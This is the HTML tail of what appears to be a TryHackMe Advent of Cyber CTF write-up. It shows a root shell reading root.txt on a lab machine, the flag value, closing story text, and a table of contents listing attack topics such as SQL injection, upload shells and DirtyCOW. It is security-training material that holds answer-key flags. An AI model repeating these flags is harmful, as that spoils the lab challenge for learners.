anchorWithStickyNavbar_LWe7" id="getting-root-flag-roottxt">Getting root flag: <code>root.txt</code><a href="#getting-root-flag-roottxt" class="hash-link" aria-label="Direct link to getting-root-flag-roottxt" title="Direct link to getting-root-flag-roottxt">​</a></h3><p>Now, we can change into the root user&#x27;s home directory and cat out the flag.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">/mnt/root # cd root  </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/mnt/root/root # ls -alF</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 32</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwx------    4 root     root          4096 Dec 20 03:51 ./</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x   23 root     root          4096 Dec 18 14:18 ../</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lrwxrwxrwx    1 root     root             9 Dec 18 17:43 .bash_history -&gt; /dev/null</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-x---    3 root     root          4096 Dec 20 03:51 .config/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lrwxrwxrwx    1 root     root             9 Dec 19 15:15 .mysql-history -&gt; /dev/null</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-------    1 root     root           264 Dec 19 15:19 .mysql_history</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--    1 root     root           148 Aug 17  2015 .profile</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwx------    2 root     root          4096 Dec 18 17:57 .ssh/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-r--------    1 root     root           600 Dec 19 20:18 root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/mnt/root/root # cat root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">THM{FLYNN_LIVES}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&quot;As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word &#x27;HOLO&#x27; embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Root flag: <code>THM{FLYNN_LIVES}</code></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/Tryhackme/Advent of Cyber/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Advent of Cyber</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/Tryhackme/Adventure Time/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Adventure Time</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#checklist" class="table-of-contents__link toc-highlight">Checklist</a></li><li><a href="#day-1-a-christmas-crisis" class="table-of-contents__link toc-highlight">Day 1: A Christmas Crisis</a><ul><li><a href="#basic-enumeration" class="table-of-contents__link toc-highlight">Basic enumeration</a></li><li><a href="#what-is-the-name-of-the-the-cookie-used-for-authentication" class="table-of-contents__link toc-highlight">What is the name of the the cookie used for authentication?</a></li><li><a href="#what-format-is-the-value-of-this-cookie-encoded-and-what-format-is-the-data-stored-in" class="table-of-contents__link toc-highlight">What format is the value of this cookie encoded and what format is the data stored in?</a></li><li><a href="#bypassing-the-authentication" class="table-of-contents__link toc-highlight">Bypassing the authentication</a></li><li><a href="#getting-the-flag" class="table-of-contents__link toc-highlight">Getting the flag</a></li><li><a href="#making-a-solve-script" class="table-of-contents__link toc-highlight">Making a solve script</a></li></ul></li><li><a href="#day-2-the-elf-strikes-back" class="table-of-contents__link toc-highlight">Day 2: The Elf Strikes Back</a><ul><li><a href="#basic-enumeration-1" class="table-of-contents__link toc-highlight">Basic enumeration</a></li><li><a href="#what-string-of-text-needs-added-to-the-url-to-get-access-to-the-upload-page" class="table-of-contents__link toc-highlight">What string of text needs added to the URL to get access to the upload page?</a></li><li><a href="#what-type-of-file-is-accepted-by-the-site" class="table-of-contents__link toc-highlight">What type of file is accepted by the site?</a></li><li><a href="#in-which-directory-are-the-uploaded-files-stored" class="table-of-contents__link toc-highlight">In which directory are the uploaded files stored?</a></li><li><a href="#getting-a-shell" class="table-of-contents__link toc-highlight">Getting a shell</a></li><li><a href="#what-is-the-flag-in-varwwwflagtxt" class="table-of-contents__link toc-highlight">What is the flag in /var/www/flag.txt?</a></li></ul></li><li><a href="#day-3-christmas-chaos" class="table-of-contents__link toc-highlight">Day 3: Christmas Chaos</a><ul><li><a href="#basic-enumeration-2" class="table-of-contents__link toc-highlight">Basic Enumeration</a></li><li><a href="#brute-force-attack" class="table-of-contents__link toc-highlight">Brute force attack</a></li></ul></li><li><a href="#day-4-santas-watching" class="table-of-contents__link toc-highlight">Day 4: Santa&#39;s watching</a><ul><li><a href="#given-the-url-httpshibesxyzapiphp-what-would-the-entire-wfuzz-command-look-like-to-query-the-breed-parameter-using-the-wordlist-bigtxt-assume-that-bigtxt-is-in-your-current-directory" class="table-of-contents__link toc-highlight">Given the URL <code>http://shibes.xyz/api.php</code>, what would the entire wfuzz command look like to query the &quot;breed&quot; parameter using the wordlist &quot;big.txt&quot; (assume that &quot;big.txt&quot; is in your current directory)</a></li><li><a href="#basic-enumeration-3" class="table-of-contents__link toc-highlight">Basic Enumeration</a></li><li><a href="#finding-the-api-directory-using-gobuster" class="table-of-contents__link toc-highlight">Finding the API directory using Gobuster</a></li><li><a href="#fuzz-the-date-parameter-on-the-file-you-found-in-the-api-directory-what-is-the-flag-displayed-in-the-correct-post" class="table-of-contents__link toc-highlight">Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?</a></li><li><a href="#getting-the-flag-1" class="table-of-contents__link toc-highlight">Getting the flag</a></li></ul></li><li><a href="#day-5-someone-stole-santas-gift-list" class="table-of-contents__link toc-highlight">Day 5: Someone stole Santa&#39;s gift list!</a><ul><li><a href="#without-using-directory-brute-forcing-whats-santas-secret-login-panel" class="table-of-contents__link toc-highlight">Without using directory brute forcing, what&#39;s Santa&#39;s secret login panel?</a></li><li><a href="#bypass-the-login-using-sql-injection" class="table-of-contents__link toc-highlight">Bypass the login using SQL injection</a></li><li><a href="#how-many-entries-are-there-in-the-gift-database" class="table-of-contents__link toc-highlight">How many entries are there in the gift database?</a></li><li><a href="#finding-the-flag" class="table-of-contents__link toc-highlight">Finding the flag</a></li><li><a href="#getting-the-admin-password" class="table-of-contents__link toc-highlight">Getting the admin password</a></li></ul></li><li><a href="#day-6-be-careful-with-what-you-wish-on-a-christmas-night" class="table-of-contents__link toc-highlight">Day 6: Be careful with what you wish on a Christmas night</a><ul><li><a href="#finding-the-cross-site-scripting" class="table-of-contents__link toc-highlight">Finding the cross-site scripting</a></li><li><a href="#getting-the-flag-2" class="table-of-contents__link toc-highlight">Getting the flag</a></li></ul></li><li><a href="#day-7-the-grinch-really-did-steal-christmas" class="table-of-contents__link toc-highlight">Day 7: The Grinch Really Did Steal Christmas</a><ul><li><a href="#unzipping" class="table-of-contents__link toc-highlight">Unzipping</a></li><li><a href="#pcap1pcap" class="table-of-contents__link toc-highlight">pcap1.pcap</a></li><li><a href="#pcap2pcap" class="table-of-contents__link toc-highlight">pcap2.pcap</a></li><li><a href="#pcap3pcap" class="table-of-contents__link toc-highlight">pcap3.pcap</a></li></ul></li><li><a href="#day-8-whats-under-the-christmas-tree" class="table-of-contents__link toc-highlight">Day 8: What&#39;s Under the Christmas Tree?</a><ul><li><a href="#running-the-nmap-scan" class="table-of-contents__link toc-highlight">Running the Nmap scan</a></li><li><a href="#what-ports-are-open" class="table-of-contents__link toc-highlight">What ports are open?</a></li><li><a href="#what-linux-distribution-is-the-box" class="table-of-contents__link toc-highlight">What Linux Distribution is the box?</a></li><li><a href="#what-is-the-http-title-for-the-webserver" class="table-of-contents__link toc-highlight">What is the &quot;HTTP-TITLE&quot; for the webserver</a></li></ul></li><li><a href="#day-9-anyone-can-be-santa" class="table-of-contents__link toc-highlight">Day 9: Anyone can be Santa!</a><ul><li><a href="#connecting-to-the-ftp-server-and-basic-enumeration" class="table-of-contents__link toc-highlight">Connecting to the FTP server and basic enumeration</a></li><li><a href="#shoppinglisttxt" class="table-of-contents__link toc-highlight">shoppinglist.txt</a></li><li><a href="#backupsh" class="table-of-contents__link toc-highlight">backup.sh</a></li><li><a href="#becoming-root-and-getting-the-flag" class="table-of-contents__link toc-highlight">Becoming root and getting the flag!</a></li></ul></li><li><a href="#day-10-dont-be-elfish" class="table-of-contents__link toc-highlight">Day 10: Don&#39;t be Elfish!</a><ul><li><a href="#getting-enum4linux" class="table-of-contents__link toc-highlight">Getting Enum4Linux</a></li><li><a href="#basic-enumeration-4" class="table-of-contents__link toc-highlight">Basic Enumeration</a></li><li><a href="#connecting-to-the-samba-server" class="table-of-contents__link toc-highlight">Connecting to the Samba server</a></li></ul></li><li><a href="#day-11-the-rogue-gnome" class="table-of-contents__link toc-highlight">Day 11: The Rogue Gnome</a><ul><li><a href="#basic-questions" class="table-of-contents__link toc-highlight">Basic Questions</a></li><li><a href="#connecting-via-ssh" class="table-of-contents__link toc-highlight">Connecting via SSH</a></li><li><a href="#privilege-escalation" class="table-of-contents__link toc-highlight">Privilege Escalation</a></li><li><a href="#getting-the-flag-3" class="table-of-contents__link toc-highlight">Getting the flag</a></li></ul></li><li><a href="#day-12-ready-set-elf" class="table-of-contents__link toc-highlight">Day 12: Ready, set, elf!</a><ul><li><a href="#vulnerability-knowledge-bases" class="table-of-contents__link toc-highlight">Vulnerability Knowledge Bases</a></li><li><a href="#basic-enumeration-5" class="table-of-contents__link toc-highlight">Basic enumeration</a></li><li><a href="#what-is-the-version-number-of-the-web-server" class="table-of-contents__link toc-highlight">What is the version number of the web server?</a></li><li><a href="#finding-the-vulnerability-using-searchsploit" class="table-of-contents__link toc-highlight">Finding the vulnerability using searchsploit</a></li><li><a href="#running-the-exploit-using-metasploit" class="table-of-contents__link toc-highlight">Running the exploit using Metasploit</a></li><li><a href="#getting-the-flag-4" class="table-of-contents__link toc-highlight">Getting the flag</a></li><li><a href="#privilege-escalation-1" class="table-of-contents__link toc-highlight">Privilege Escalation</a></li></ul></li><li><a href="#day-13-coal-for-christmas" class="table-of-contents__link toc-highlight">Day 13: Coal for Christmas</a><ul><li><a href="#basic-enumeration-6" class="table-of-contents__link toc-highlight">Basic enumeration</a></li><li><a href="#getting-a-shell-1" class="table-of-contents__link toc-highlight">Getting a shell</a></li><li><a href="#more-enumeration" class="table-of-contents__link toc-highlight">More enumeration</a></li><li><a href="#poking-around-the-filesystem" class="table-of-contents__link toc-highlight">Poking around the filesystem</a></li><li><a href="#dirtycow-cve-2016-5195" class="table-of-contents__link toc-highlight">DirtyCOW (CVE-2016-5195)</a></li><li><a href="#getting-the-flag-5" class="table-of-contents__link toc-highlight">Getting the flag</a></li></ul></li><li><a href="#day-14-wheres-rudolph" class="table-of-contents__link toc-highlight">Day 14: Where&#39;s Rudolph</a><ul><li><a href="#reddit" class="table-of-contents__link toc-highlight">Reddit</a></li><li><a href="#twitter" class="table-of-contents__link toc-highlight">Twitter</a></li><li><a href="#photo-exif-data" class="table-of-contents__link toc-highlight">Photo EXIF Data</a></li><li><a href="#finding-rudolphs-password" class="table-of-contents__link toc-highlight">Finding Rudolph&#39;s Password</a></li><li><a href="#finding-rudolphs-location" class="table-of-contents__link toc-highlight">Finding Rudolph&#39;s location</a></li></ul></li><li><a href="#day-15-theres-a-python-in-my-stocking" class="table-of-contents__link toc-highlight">Day 15: There&#39;s a Python in my stocking!</a><ul><li><a href="#whats-the-output-of-true--true" class="table-of-contents__link toc-highlight">What&#39;s the output of <code>True + True</code>?</a></li><li><a href="#whats-the-database-for-installing-other-peoples-libraries-called" class="table-of-contents__link toc-highlight">What&#39;s the database for installing other peoples libraries called?</a></li><li><a href="#what-is-the-output-of-boolfalse" class="table-of-contents__link toc-highlight">What is the output of bool(&quot;False&quot;)?</a></li><li><a href="#what-library-lets-us-download-the-html-of-a-webpage" class="table-of-contents__link toc-highlight">What library lets us download the HTML of a webpage?</a></li><li><a href="#what-is-the-output-of-the-program-provided-in-code-to-analyse-for-question-5-in-todays-material" class="table-of-contents__link toc-highlight">What is the output of the program provided in &quot;Code to analyse for Question 5&quot; in today&#39;s material?</a></li></ul></li><li><a href="#day-16-help-where-is-santa" class="table-of-contents__link toc-highlight">Day 16: Help! Where is Santa?</a><ul><li><a href="#basic-enumeration-7" class="table-of-contents__link toc-highlight">Basic enumeration</a></li><li><a href="#visiting-the-webpage" class="table-of-contents__link toc-highlight">Visiting the webpage</a></li><li><a href="#finding-santas-location" class="table-of-contents__link toc-highlight">Finding Santa&#39;s Location</a></li><li><a href="#finding-the-api-endpoint" class="table-of-contents__link toc-highlight">Finding the API endpoint</a></li><li><a href="#finding-santas-location-1" class="table-of-contents__link toc-highlight">Finding Santa&#39;s Location</a></li></ul></li><li><a href="#day-17-reverseelfneering" class="table-of-contents__link toc-highlight">Day 17: ReverseELFneering</a><ul><li><a href="#getting-started" class="table-of-contents__link toc-highlight">Getting started</a></li><li><a href="#practicing-with-file1" class="table-of-contents__link toc-highlight">Practicing with file1</a></li><li><a href="#moving-on-to-challenge1" class="table-of-contents__link toc-highlight">Moving on to challenge1</a></li><li><a href="#side-note" class="table-of-contents__link toc-highlight">Side note</a></li></ul></li><li><a href="#day-18-the-bits-of-the-christmas" class="table-of-contents__link toc-highlight">Day 18: The Bits of the Christmas</a><ul><li><a href="#connecting-to-the-windows-machine-using-rdp" class="table-of-contents__link toc-highlight">Connecting to the Windows Machine using RDP</a></li><li><a href="#getting-santas-password-and-the-flag" class="table-of-contents__link toc-highlight">Getting Santa&#39;s password and the flag!</a></li><li><a href="#although-technically-the-flags-in-the-previous-screenshot" class="table-of-contents__link toc-highlight">Although technically the flag&#39;s in the previous screenshot...</a></li></ul></li><li><a href="#day-19-the-naughty-or-nice-list" class="table-of-contents__link toc-highlight">Day 19: The Naughty or Nice List</a><ul><li><a href="#finding-the-vulnerability" class="table-of-contents__link toc-highlight">Finding the vulnerability</a></li><li><a href="#getting-the-flag-6" class="table-of-contents__link toc-highlight">Getting the flag</a></li></ul></li><li><a href="#day-20-powershellf-to-the-rescue" class="table-of-contents__link toc-highlight">Day 20: PowershELlF to the rescue</a><ul><li><a href="#connecting-via-ssh-1" class="table-of-contents__link toc-highlight">Connecting via SSH</a></li><li><a href="#getting-started-in-powershell" class="table-of-contents__link toc-highlight">Getting started in PowerShell</a></li><li><a href="#search-for-the-first-hidden-elf-file-within-the-documents-folder-read-the-contents-of-this-file-what-does-elf-1-want" class="table-of-contents__link toc-highlight">Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?</a></li><li><a href="#search-on-the-desktop-for-a-hidden-folder-that-contains-the-file-for-elf-2-read-the-contents-of-this-file-what-is-the-name-of-that-movie-that-elf-2-wants" class="table-of-contents__link toc-highlight">Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?</a></li><li><a href="#search-the-windows-directory-for-a-hidden-folder-that-contains-files-for-elf-3-what-is-the-name-of-the-hidden-folder" class="table-of-contents__link toc-highlight">Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder?</a></li><li><a href="#how-many-words-does-the-first-file-contain" class="table-of-contents__link toc-highlight">How many words does the first file contain?</a></li><li><a href="#what-2-words-are-at-index-551-and-6991-in-the-first-file" class="table-of-contents__link toc-highlight">What 2 words are at index 551 and 6991 in the first file?</a></li><li><a href="#search-in-the-2nd-file-for-the-phrase-from-the-previous-question-to-get-the-full-answer-what-does-elf-3-want" class="table-of-contents__link toc-highlight">Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want?</a></li></ul></li><li><a href="#day-21-time-for-some-elforensics" class="table-of-contents__link toc-highlight">Day 21: Time for some ELForensics</a><ul><li><a href="#connecting-via-rdp" class="table-of-contents__link toc-highlight">Connecting via RDP</a></li><li><a href="#getting-started-1" class="table-of-contents__link toc-highlight">Getting started</a></li><li><a href="#contents-of-the-db-file-hashtxt-file" class="table-of-contents__link toc-highlight">Contents of the &quot;<code>db file hash.txt</code>&quot; file.</a></li><li><a href="#getting-the-hash-of-deebeeexe" class="table-of-contents__link toc-highlight">Getting the hash of <code>deebee.exe</code></a></li><li><a href="#getting-the-flag-7" class="table-of-contents__link toc-highlight">Getting the flag!</a></li><li><a href="#running-the-real-database-connector-and-getting-another-flag" class="table-of-contents__link toc-highlight">Running the real database connector and getting another flag!</a></li></ul></li><li><a href="#day-22-elf-mceager-becomes-cyberelf" class="table-of-contents__link toc-highlight">Day 22: Elf McEager becomes CyberElf</a><ul><li><a href="#logging-in" class="table-of-contents__link toc-highlight">Logging in</a></li><li><a href="#opening-keypass" class="table-of-contents__link toc-highlight">Opening keypass</a></li><li><a href="#getting-the-passwords" class="table-of-contents__link toc-highlight">Getting the passwords</a></li><li><a href="#getting-the-flag-8" class="table-of-contents__link toc-highlight">Getting the flag</a></li></ul></li><li><a href="#day-23-the-grinch-strikes-again" class="table-of-contents__link toc-highlight">Day 23: The Grinch strikes again</a><ul><li><a href="#connecting-via-rdp-1" class="table-of-contents__link toc-highlight">Connecting via RDP</a></li><li><a href="#reading-the-ransomnote" class="table-of-contents__link toc-highlight">Reading the ransomnote</a></li><li><a href="#looking-at-the-encrypted-files" class="table-of-contents__link toc-highlight">Looking at the encrypted files</a></li><li><a href="#looking-through-the-scheduled-tasks" class="table-of-contents__link toc-highlight">Looking through the scheduled tasks</a></li><li><a href="#looking-for-a-vss-scheduled-task" class="table-of-contents__link toc-highlight">Looking for a VSS scheduled task</a></li></ul></li><li><a href="#day-24-the-trial-before-christmas" class="table-of-contents__link toc-highlight">Day 24: The Trial Before Christmas</a><ul><li><a href="#basic-enumeration-8" class="table-of-contents__link toc-highlight">Basic Enumeration</a></li><li><a href="#what-is-the-title-of-the-webpages" class="table-of-contents__link toc-highlight">What is the title of the webpages</a></li><li><a href="#gobuster" class="table-of-contents__link toc-highlight">Gobuster</a></li><li><a href="#evading-the-upload-filter" class="table-of-contents__link toc-highlight">Evading the upload filter</a></li><li><a href="#getting-web-flag-webtxt" class="table-of-contents__link toc-highlight">Getting web flag: <code>web.txt</code></a></li><li><a href="#spawning-a-stable-shell-using-python" class="table-of-contents__link toc-highlight">Spawning a stable shell using Python</a></li><li><a href="#poking-through-the-filesystem" class="table-of-contents__link toc-highlight">Poking through the filesystem</a></li><li><a href="#accessing-the-database" class="table-of-contents__link toc-highlight">Accessing the database</a></li><li><a href="#cracking-the-password-hash" class="table-of-contents__link toc-highlight">Cracking the password hash</a></li><li><a href="#becoming-flynn" class="table-of-contents__link toc-highlight">Becoming Flynn</a></li><li><a href="#getting-user-flag-usertxt" class="table-of-contents__link toc-highlight">Getting user flag: <code>user.txt</code></a></li><li><a href="#privilege-escalation-2" class="table-of-contents__link toc-highlight">Privilege Escalation</a></li><li><a href="#getting-root-flag-roottxt" class="table-of-contents__link toc-highlight">Getting root flag: <code>root.txt</code></a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>